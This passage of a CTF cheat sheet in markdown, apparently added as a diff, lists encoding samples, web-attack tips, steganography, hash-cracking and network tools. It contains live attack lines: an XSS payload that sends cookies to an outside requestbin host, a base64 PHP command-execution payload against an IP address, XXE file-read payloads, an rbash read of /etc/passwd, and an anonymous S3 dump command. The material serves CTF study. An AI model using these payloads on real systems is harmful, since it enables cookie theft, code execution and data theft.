+	If your challenges references "EFF" or includes dice in some way, or showcases numbers 1-6 of length 5, try [https://www.eff.org/dice](https://www.eff.org/dice). This could refer to a passphrase generated by dice rolls available here: [https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt](https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt)
+
+* [Base64], [Base32], [Base85], [Base91](https://www.dcode.fr/base-91-encoding) 
+```
+Base64:
+TWFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5vdCBvbmx5IGJ5IGhpcyByZWFzb24sIGJ1dCBieSB0aGlz
+IHNpbmd1bGFyIHBhc3Npb24gZnJvbSBvdGhlciBhbmltYWxzLCB3aGljaCBpcyBhIGx1c3Qgb2Yg
+dGhlIG1pbmQsIHRoYXQgYnkgYSBwZXJzZXZlcmFuY2Ugb2YgZGVsaWdodCBpbiB0aGUgY29udGlu
+dWVkIGFuZCBpbmRlZmF0aWdhYmxlIGdlbmVyYXRpb24gb2Yga25vd2xlZGdlLCBleGNlZWRzIHRo
+ZSBzaG9ydCB2ZWhlbWVuY2Ugb2YgYW55IGNhcm5hbCBwbGVhc3VyZS4=
+```
+
+```
+Base32
+ORUGS4ZANFZSAYLOEBSXQYLNOBWGKIDPMYQGEYLTMUZTELRANF2CA2LTEB3GS43JMJWGKIDCPEQGY33UOMQG6ZRAMNQXA2LUMFWCA3DFOR2GK4TTEBQW4ZBANVXXEZJAMVYXKYLMOMQHG2LHNZZSAZTPOIQHAYLEMRUW4ZZMEBSXQ5DSME======
+```
+
+```
+Base85:
+<~9jqo^BlbD-BleB1DJ+*+F(f,q/0JhKF<GL>Cj@.4Gp$d7F!,L7@<6@)/0JDEF<G%<+EV:2F!,
+O<DJ+*.@<*K0@<6L(Df-\0Ec5e;DffZ(EZee.Bl.9pF"AGXBPCsi+DGm>@3BB/F*&OCAfu2/AKY
+i(DIb:@FD,*)+C]U=@3BN#EcYf8ATD3s@q?d$AftVqCh[NqF<G:8+EV:.+Cf>-FD5W8ARlolDIa
+l(DId<j@<?3r@:F%a+D58'ATD4$Bl@l3De:,-DJs`8ARoFb/0JMK@qB4^F!,R<AKZ&-DfTqBG%G
+>uD.RTpAKYo'+CT/5+Cei#DII?(E,9)oF*2M7/c~>
+```
+
+```
+Base91:
+8D$J`/wC4!c.hQ;mT8,<p/&Y/H@$]xlL3oDg<W.0$FW6GFMo_D8=8=}AMf][|LfVd/<P1o/1Z2(.I+LR6tQQ0o1a/2/WtN3$3t[x&k)zgZ5=p;LRe.{B[pqa(I.WRT%yxtB92oZB,2,Wzv;Rr#N.cju"JFXiZBMf<WMC&$@+e95p)z01_*UCxT0t88Km=UQJ;WH[#F]4pE>i3o(g7=$e7R2u>xjLxoefB.6Yy#~uex8jEU_1e,MIr%!&=EHnLBn2h>M+;Rl3qxcL5)Wfc,HT$F]4pEsofrFK;W&eh#=#},|iKB,2,W]@fVlx,a<m;i=CY<=Hb%}+},F
+```
+
+
+* [Base65535](https://github.com/qntm/base65536)
+
+
+	Unicode characters encoding. Includes a lot of seemingly random spaces and chinese characters!
+
+```
+𤇃𢊻𤄻嶜𤄋𤇁𡊻𤄛𤆬𠲻𤆻𠆜𢮻𤆻ꊌ𢪻𤆻邌𤆻𤊻𤅋𤲥𣾻𤄋𥆸𣊻𤅛ꊌ𤆻𤆱炼綻𤋅𤅴薹𣪻𣊻𣽻𤇆𤚢𣺻赈𤇣綹𤻈𤇣𤾺𤇃悺𢦻𤂻𤅠㢹𣾻𤄛𤆓𤦹𤊻𤄰炜傼𤞻𢊻𣲻𣺻ꉌ邹𡊻𣹫𤅋𤇅𣾻𤇄𓎜𠚻𤊻𢊻𤉛𤅫𤂑𤃃𡉌𤵛𣹛𤁐𢉋𡉻𡡫𤇠𠞗𤇡𡊄𡒌𣼻燉𣼋𦄘炸邹㢸𠞻𠦻𡊻𣈻𡈻𣈛𡈛ꊺ𠆼𤂅𣻆𣫃𤮺𤊻𡉋㽻𣺬𣈛𡈋𤭻𤂲𣈻𤭻𤊼𢈛儛𡈛ᔺ
+```
+
+* [Base41](https://github.com/sveljko/base41/blob/master/python/base41.py)
+
+* "Unflattening" Base64 in lowercase or uppercase
+
+	Some time ago we needed to recover the original Base64 string from one that is in all lowercase or all uppercase. Caleb wrote a good script to smartly do this: [https://pastebin.com/HprZcHrY](https://pastebin.com/HprZcHrY)
+
+
+## AES
+
+[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the same key for encryption and decryption.
+
+* AES ECB
+
+	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length.
+<br><br>
+
+# Web
+
+
+* [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)
+
+	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.
+
+``` python
+#!/usr/bin/env python
+
+import cfscrape
+
+url = 'http://yashit.tech/tryharder/'
+
+scraper = cfscrape.create_scraper()
+print scraper.get(url).content
+```
+
+* [`wpscan`](https://wpscan.org/)
+
+	* A Ruby script to scan and do reconnaissance on a [Wordpress](https://en.wikipedia.org/wiki/WordPress) application.
+
+* Mac AutoLogin Password Cracking
+
+Sometimes, given an Mac autologin password file `/etc/kcpassword`, you can crack it with this code:
+
+```
+def kcpasswd(ciphertext):
+    key = '7d895223d2bcddeaa3b91f'
+    while len(key) < (len(ciphertext)*2):
+        key = key + key
+    key = binasciiunhexlify(key)
+    result = ''
+    for i in range(len(ciphertext)):
+        result += chr(ord(ciphertext[i]) ^ (key[i]))
+    return result
+```
+* XXE : XML External Entity
+
+An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
+We try to display the content of the file /flag :
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///flag">
+]>
+<data>&file;</data>
+
+<?xml version="1.0" encoding="UTF-16"?>
+  <!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
+
+  ```
+* Wordpress Password Hash Generator
+
+	If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: [http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4). This will let you login to /wp-admin/ on the site.
+
+
+
+
+* Flask Template Injection
+
+	Try `{{config}}` to leak out the secret key, or start to climb up the Python MRO to acheive code execution.
+
+	[https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html](https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html), [https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html](https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html), [https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html](https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)
+
+
+
+* [`nikto`](https://github.com/sullo/nikto)
+
+	A Perl script to scan and do reconnaissance on a web application.
+
+
+* [Burpsuite](https://portswigger.net/burp)
+
+	A proxy server that allows you to intercept and modify HTTP requests and responses. It's a great tool for testing web applications.
+
+
+
+
+* AWS / S3 Buckets
+
+	You can try and dump an AWS bucket like so. The `--no-sign-request` avoids the need for credentials, and `--recursive` will grab everything possible.
+
+```
+aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
+```
+	i. e. `aws s3 cp --recursive --no-sign-request s3://tamuctf .`
+
+
+## SQL Injection
+
+* [`sqlmap`](https://github.com/sqlmapproject/sqlmap)
+
+	A command-line tool written in [Python](https://www.python.org/) to automatically detect and exploit vulnerable SQL injection points.
+
+* SQL `IF` statements
+
+	These are handy for some injections and setting up some Blind SQL if you need to. Syntax is like `SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )`
+
+* Explicit SQL Injection
+
+
+
+* Blind SQL Injection
+
+
+## Enumeration
+
+
+
+* `robots.txt`
+
+	File to tell search engines not to index certain files or directories.
+
+
+* Mac / Macintosh / Apple Hidden Files `.DS_Store` [DS_Store_crawler](https://github.com/anantshri/DS_Store_crawler_parser)
+
+	On Mac computers, there is a hidden index file `.DS_Store`. Useful if you have a **LFI** vulnerability.
+
+```bash
+python3 dsstore_crawler.py -i <url>
+```
+
+* Bazaar `.bzr` directory
+
+	Contains the history of the project. Can be used to find old versions of the project. Can be fetched with [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)
+
+Download the bzr repository:
+```bash
+bzr branch <url> <out-dir>
+```
+
+* `/.git/`
+
+	Sign of an exposed git repository. Contains the history of the project. Can be used to find old versions of the project and to maybe find credentials in sources.
+
+* [`GitDumper`](https://github.com/arthaud/git-dumper)
+
+	A command-line tool that will automatically scrape and download a [git](https://git-scm.com/) repository hosted online with a given URL.
+
+```bash
+gitdumper <url>/.git/ <out-dir>
+```
+
+
+
+## NoSQL Injection
+
+
+
+## PHP
+
+
+* Magic Hashes
+
+	A common vulnerability in [PHP](https://en.wikipedia.org/wiki/PHP) that fakes hash "collisions..." where the `==` operator falls short in [PHP](https://en.wikipedia.org/wiki/PHP) type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes), but below are the most common breaks.
+
+| Plaintext | MD5 Hash |
+| --------- | -------- |
+|240610708|0e462097431906509019562988736854|
+|QLTHNDT|0e405967825401955372549139051580|
+|QNKCDZO|0e830400451993494058024219903391|
+|PJNPDWY|0e291529052894702774557631701704|
+|NWWKITQ|0e763082070976038347657360817689|
+|NOOPCJF|0e818888003657176127862245791911|
+|MMHUWUV|0e701732711630150438129209816536|
+|MAUXXQC|0e478478466848439040434801845361|
+|IHKFRNS|0e256160682445802696926137988570|
+|GZECLQZ|0e537612333747236407713628225676|
+|GGHMVOE|0e362766013028313274586933780773|
+|GEGHBXL|0e248776895502908863709684713578|
+|EEIZDOI|0e782601363539291779881938479162|
+|DYAXWCA|0e424759758842488633464374063001|
+|DQWRASX|0e742373665639232907775599582643|
+|BRTKUJZ|00e57640477961333848717747276704|
+|ABJIHVY|0e755264355178451322893275696586|
+|aaaXXAYW|0e540853622400160407992788832284|
+|aabg7XSs|0e087386482136013740957780965295|
+|aabC9RqS|0e041022518165728065344349536299|
+|0e215962017|0e291242476940776845150308577824|
+
+| Plaintext | SHA1 Hash |
+| --------- | --------- |
+|aaroZmOk|0e66507019969427134894567494305185566735|
+|aaK1STfY|0e76658526655756207688271159624026011393|
+|aaO8zKZF|0e89257456677279068558073954252716165668|
+|aa3OFF9m|0e36977786278517984959260394024281014729|
+
+| Plaintext | MD4 Hash |
+| --------- | --------- |
+|bhhkktQZ|0e949030067204812898914975918567|
+|0e001233333333333334557778889|0e434041524824285414215559233446|
+|0e00000111222333333666788888889|0e641853458593358523155449768529|
+|0001235666666688888888888|0e832225036643258141969031181899|
+
+
+* `preg_replace`
+
+	A bug in older versions of [PHP](https://en.wikipedia.org/wiki/PHP) where the user could get remote code execution
+
+	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)
+
+
+* [`phpdc.phpr`](https://github.com/lighttpd/xcache/blob/master/bin/phpdc.phpr)
+
+	A command-line tool to decode [`bcompiler`](http://php.net/manual/en/book.bcompiler.php) compiled [PHP](https://en.wikipedia.org/wiki/PHP) code.
+
+
+* [`php://filter` for Local File Inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)
+
+	A bug in [PHP](https://en.wikipedia.org/wiki/PHP) where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:
+
+```
+http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+```
+
+
+* `data://text/plain;base64`
+
+	A [PHP](https://en.wikipedia.org/wiki/PHP) stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868) ... TL;DR:
+
+```
+http://103.5.112.91:1234/?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
+```
+
+
+* [`PHP Generic Gadget Chains`](https://github.com/ambionics/phpggc)
+
+	Payloads for Object injection in `unserialize` on different frameworks.
+
+## XSS
+
+The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.
+
+* [XSS]/[Cross-site scripting]
+
+	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML](https://en.wikipedia.org/wiki/HTML) and ideally inject [JavaScript](https://en.wikipedia.org/wiki/JavaScript) code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:
+
+
+```
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+```
+
+	Typically you use this to steal cookies or other information, and you can do this with an online requestbin.
+
+```
+<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
+```
+* new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
+
+* [XSStrike](https://github.com/UltimateHackers/XSStrike) 
+	A command-line tool for automated [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) attacks. Seems to function like how [sqlmap](https://github.com/sqlmapproject/sqlmap) does.
+
+* [`requestb.in`](https://requestb.in/)
+
+	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilty.
+
+* [`hookbin.com`](https://hookbin.com/)
+
+	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilty.
+<br><br>
+
+# Steganography
+
+WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY PASSWORD!
+
+* [`steghide`](http://steghide.sourceforge.net/)
+
+	Hide data in various kinds of image- and audio-files using a passphrase.
+
+* [StegCracker](https://github.com/Paradoxis/StegCracker)
+
+	Brute force passphrases for steghide encrypted files. Different data can have different passphrases.
+
+* [Steganography Online](http://stylesuxx.github.io/steganography/)
+
+	Online tool to hide data in images.
+
+* [StegSeek](https://github.com/RickdeJager/stegseek)
+
+	Faster than `stegcracker`.
+
+* [`steg_brute.py`](https://github.com/Va5c0/Steghide-Brute-Force-Tool)
+
+	This is similar to `stegcracker`.
+
+* [`Stegsolve.jar`](http://www.caesum.com/handbook/stego.htm)
+
+	View the image in different colorspaces and alpha channels.
+
+
+* [`stepic`](http://domnit.org/stepic/doc/)
+
+	Python library to hide data in images.
+
+* [Digital Invisible Ink Stego Tool](http://diit.sourceforge.net/)
+
+	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit colour)
+
+
+* [ImageHide](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)
+
+	Hide any data in the LSB of an image. Can have a password.
+
+* [stegoVeritas](https://github.com/bannsec/stegoVeritas/)
+
+	CLI tool to extract data from images.
+
+* Unicode Steganography / Zero-Width Space Characters
+
+	Messages can be hidden in the unicode characters. For example usig the zero-width space character in it. Use a modern IDE like [Code](https://code.visualstudio.com/) to find these characters.
+
+* Online LSB Tools
+
+	Some online tools to hide data in the LSB of images.
+
+	[https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/) Only supports PNG
+	[https://stylesuxx.github.io/steganography/](https://stylesuxx.github.io/steganography/)
+
+* Other stego tools:
+
+	[https://github.com/DominicBreuker/stego-toolkit](https://github.com/DominicBreuker/stego-toolkit)
+
+* [`zsteg`](https://github.com/zed-0xff/zsteg)
+
+	Command-line tool for **PNG** and **BMP** steganography.
+
+* [`jsteg`](https://github.com/lukechampine/jsteg)
+
+    Command-line tool for **JPEG** steganography.
+
+* [Jstego][https://sourceforge.net/projects/jstego/]
+
+    GUI tool for **JPG** steganography.
+
+* [`openstego`](https://www.openstego.com/)
+
+	Steganography tool.
+
+* Morse Code
+
+	Morse code can be everywhere.
+
+* Whitespace
+
+	Tabs and spaces (for exemple in the indentation) can hide data. Some tools can find it: [`snow`](http://www.darkside.com.au/snow/) or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)
+
+* [`snow`](http://www.darkside.com.au/snow/)
+
+	A command-line tool for whitespace steganography.
+
+* [`exiftool`](https://exiftool.org/)
+
+	Tool to view and edit metadata in files.
+
+* Extract Thumbnail (data is covered in original image)
+
+	If you have an image where the data you need is covered, try viewing the thumbnail:
+
+```
+exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
+```
+
+* [spectrogram](https://en.wikipedia.org/wiki/Spectrogram)
+
+	An image can be hidden in the spectrogram of an audio file. [`audacity`](https://www.audacityteam.org/) can show the spectrogram of an audio file. (To select Spectrogram view, click on the track name (or the black triangle) in the Track Control Panel which opens the Track Dropdown Menu, where the spectrogram view can be selected.. )
+
+* [XIAO Steganography](https://xiao-steganography.en.softonic.com/)
+
+	Windows software to hide data in audio.
+
+* [DTMF](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).
+
+	Dual tone multi-frequency is a signaling system using the voice-frequency band over telephone lines. It can be used to send text messages over the phone. Some tool: [Detect DTMF Tones](http://dialabc.com/sound/detect/index.html) 
+	
+
+* Phone-Keypad
+
+	Letters can be encoded with numbers using a phone keypad.
+
+![https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov)
+
+* [`hipshot`](https://bitbucket.org/eliteraspberries/hipshot)
+
+	A python tool to hide a video in an image.
+
+* [QR code](https://en.wikipedia.org/wiki/QR_code) 
+	
+	Square barcode that can store data.
+
+* [`zbarimg`](https://linux.die.net/man/1/zbarimg)
+
+	CLI tool to scan QR codes of different types.
+
+
+* Corrupted image files
+
+	See [Images forensics](#images)
+
+<br><br>
+
+# PDF Files
+
+
+* `pdfinfo`
+
+	A command-line tool to get a basic synopsis of what the [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file is.
+
+* `pdfcrack`
+
+	A comand-line tool to __recover a password from a PDF file.__ Supports dictionary wordlists and bruteforce.
+
+* `pdfimages`
+
+	A command-line tool, the first thing to reach for when given a PDF file. It extracts the images stored in a PDF file, but it needs the name of an output directory (that it will create for) to place the found images.
+
+* [`pdfdetach`](https://www.systutorials.com/docs/linux/man/1-pdfdetach/)
+
+	A command-line tool to extract files out of a [PDF].
+<br><br>
+
+# ZIP Files
+
+* `zip2john`
+
+    Brute force password protected zip files.
+
+``` bash
+$ zip2john protected.zip > protected.john
+$ john --wordlist=/usr/share/wordlists/rockyou.txt protected.john
+```
+
+* [`bkcrack`](https://github.com/kimci86/bkcrack)
+
+    Crack ZipCrypto Store files. Need some plaintext to work.
+
+
+<br><br>
+
+# Hashes
+
+* [Hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
+    Different hash types exists, and they are used in different contexts. This page lists the most common hash types and their respective hashcat modes.
+
+| Hash type | Byte Length | Hashcat mode | Example hash  |
+|-----------|--------------|--------------|--------------|
+| MD5      | 32  | 0    | `8743b52063cd84097a65d1633f5c74f5` |
+| SHA1     | 40  | 100  | `b89eaac7e61417341b710b727768294d0e6a277b` |
+| SHA256   | 64  | 1400 | `127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935` |
+| SHA2-512 | 128 | 1700 | too long |
+
+
+
+* [Haiti](https://github.com/noraj/haiti/)
+
+    CLI Hash type identifier
+
+* [Hashcat](https://hashcat.net/hashcat/)
+
+    Crack hashes. Can use GPU.
+
+
+* [John the Ripper](https://www.openwall.com/john/)
+
+    Better compatibility and easier to use than hashcat, but lower number of hash types supported.
+
+* [dcipher](https://github.com/k4m4/dcipher-cli)
+
+    CLI tool to lookup hashes in online databases.
+<br><br>
+
+# OSINT
+
+* [`Sherlock`](https://github.com/sherlock-project/sherlock)
+
+    Python script to search for usernames across social networks.
+
+* [Google reverse image search](https://www.google.fr/imghp)
+
+    Search by image.
+<br><br>
+
+# Network
+
+
+* [Wireshark](https://www.wireshark.org/) 
+	The go-to tool for examining [`.pcap`](https://en.wikipedia.org/wiki/Pcap) files.
+
+* [Network Miner](http://www.netresec.com/?page=NetworkMiner) 
+	Seriously cool tool that will try and scrape out images, files, credentials and other goods from [PCAP](https://en.wikipedia.org/wiki/Pcap) and [PCAPNG](https://github.com/pcapng/pcapng) files.
+
+* [PCAPNG](https://github.com/pcapng/pcapng) 
+	Not all tools like the [PCAPNG](https://github.com/pcapng/pcapng) file format... so you can convert them with an online tool [http://pcapng.com/](http://pcapng.com/) or from the command-line with the `editcap` command that comes with installing [Wireshark]:
+
+```
+editcap old_file.pcapng new_file.pcap
+```
+
+* [`tcpflow`](https://github.com/simsong/tcpflow)
+
+	A command-line tool for reorganizing packets in a PCAP file and getting files out of them. __Typically it gives no output, but it creates the files in your current directory!__
+
+```
+tcpflow -r my_file.pcap
+ls -1t | head -5 # see the last 5 recently modified files
+```
+
+
+
+* [PcapXray](https://github.com/Srinivas11789/PcapXray) 
+	A GUI tool to visualize network traffic.
+	
+
+* [iodine](https://github.com/yarrick/iodine)
+
+	DNS tunel, used to bypass firewalls. Can be decipherd with [this script](Network/Tools/iodine/exploit.py)
+<br><br>
+
+# Jail Break
+
+* Missing `ls` or `dir` commands
+
+	If you cannot run `ls` or `dir`, or `find` or `grep`, to list files you can use
+
+```
+echo *
+echo /any/path/*
+```
+
+
+* restricted bash (`rbash`) read files
+
+	If you are a restricted shell like `rbash` you can still read any file with some builtin commands like `mapfile`:
+
+```
+mapfile -t  < /etc/passwd
+printf "$s\n" "${anything[@]}"
+```
+
+
+* Python 3
+
+    `().__class__.__base__.__subclasses__()` - Gives access to `object` subclasses
+<br><br>
+
+# Android
+
+
+
+## APK Forensics
+
+* [`jadx`](https://github.com/skylot/jadx)
+
+    Decompiles Android APKs to Java source code.
+
+* [`apktool`](https://ibotpeaches.github.io/Apktool/)
+
+	A command-line tool to extract all the resources from an APK file. Usage:
+
+```
+apktool d <file.apk>
+```
+
+
+* [`dex2jar`](https://github.com/pxb1988/dex2jar)
+
+	A command-line tool to convert a J.dex file to .class file and zip them as JAR files.
+
+
+* [`jd-gui`](https://github.com/java-decompiler/jd-gui)
+
+	A GUI tool to decompile Java code, and JAR files.
+
+
+<br><br>
+
+# Esoteric Languages
+
+Tools
+-----
+
+* [DCode](https://www.dcode.fr)
+
+	Support many crypto algorithms, but also some interesting tools.
+
+
+* [Try It Online](https://tio.run/)
+
+	Online tool for running code in many languages.
+
+
+Languages
+---------
+
+* [Brainfuck](https://esolangs.org/wiki/brainfuck)
+
+	Famous esoteric language, with a very simple syntax. Functions like a Turing machine.
+
+Exemple Hello World:
+```brainfuck
+++++++++[>++++[>++>+++>+++>+<<<<-]>+>+>->>+[<]<-]>>.>---.+++++++..+++.>>.<-.<.+++.------.--------.>>+.>++.
+```
+
+* [COW](https://esolangs.org/wiki/COW)
+
+	Uses MOO statements in different capitalizations to represent different instructions.
+
+```
+ MoO moO MoO mOo MOO OOM MMM moO moO
+ MMM mOo mOo moO MMM mOo MMM moO moO
+ MOO MOo mOo MoO moO moo mOo mOo moo
+ ```
+
+* [Malboge](https://esolangs.org/wiki/malbolge)
+
+	Very hard language, that looks like Base85.
+
+```
+(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
+```
+
+* [Piet](https://esolangs.org/wiki/piet)
+
+	Programs are represented as images. Can be interpreted with [`npiet`](https://www.bertnase.de/npiet/)
+
+![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)
+
+* [Ook!](http://esolangs.org/wiki/ook!)
+
+	Recognizable by `.` and `?`, and `!`. Online interpreter for this language: [https://www.dcode.fr/ook-language](https://www.dcode.fr/ook-language) 
+	
+
+Exemple code:
+```
+Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
+Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
+Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+```
+
+* [Rockstar](https://esolangs.org/wiki/Rockstar)
+
+	Look like song lyrics.
+	Rockstar has an official online interpreter: [https://codewithrockstar.com/online](https://codewithrockstar.com/online)
+
+Fizzbuzz in Rockstar:
+```
+Midnight takes your heart and your soul
+While your heart is as high as your soul
+Put your heart without your soul into your heart
+
+Give back your heart
+
+
+Desire is a lovestruck ladykiller
+My world is nothing
+Fire is ice
+Hate is water
+Until my world is Desire,
+Build my world up
+If Midnight taking my world, Fire is nothing and Midnight taking my world, Hate is nothing
+Shout "FizzBuzz!"
+Take it to the top
+
+If Midnight taking my world, Fire is nothing
+Shout "Fizz!"
+Take it to the top
+
+If Midnight taking my world, Hate is nothing
+Say "Buzz!"
+Take it to the top
+
+Whisper my world
+```
+<br><br>
+
+# Data Science
+
+* [SciKit Lean](https://scikit-learn.org/)
+
+    Machine learning in Python.
+
+* [SciKit Mine](https://scikit-mine.github.io/scikit-mine/)
+
+    Data mining in Python.
+
+## Unsupervised clasification
+
+
+
+## Image classification
+
+
+
+## Feature prediction
+
+
+<br><br>
+
+# Signal processing
+
+
+<br><br>
+
+# Chemistry
+
+
+<br><br>
+
+# Other CheatSheets
+
+
+* [CTF-Katana](https://github.com/JohnHammond/ctf-katana)
+
+    Most of the tools and idaes provided come from there.
+
+* [Hack Tricks](https://book.hacktricks.xyz/)
+
+    A collection of useful commands and tricks for penetration testing.
+
+* [thehacker.recipes](https://www.thehacker.recipes/)
+
+    Very complete on Active Directory.
+
+* [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
+
+	Super useful repo that has a payload for basically every sceario
+
+* [SecLists](https://github.com/danielmiessler/SecLists)
+
+    A LOT of wordlists for different purposes.
